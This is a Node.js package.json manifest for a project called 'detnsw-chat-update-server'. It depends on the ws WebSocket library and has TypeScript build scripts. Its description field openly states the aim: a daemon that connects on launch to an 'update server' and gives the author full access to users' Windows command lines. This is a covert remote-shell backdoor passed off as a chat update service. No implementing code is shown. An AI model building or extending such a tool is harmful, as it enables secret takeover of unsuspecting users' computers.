{
    "name": "detnsw-chat-update-server",
    "description": "On server launch, a daemon will connect to the update server, granting me full access to the user's CLI assuming they're on Windows",
    "dependencies": {
        "ws": "latest"
    },
    "devDependencies": {
        "typescript": "latest",
        "@types/node": "latest"
    },
    "main": "./dist/index.js",
    "scripts": {
        "build": "tsc",
        "start": "node ./dist/index.js"
    }
}
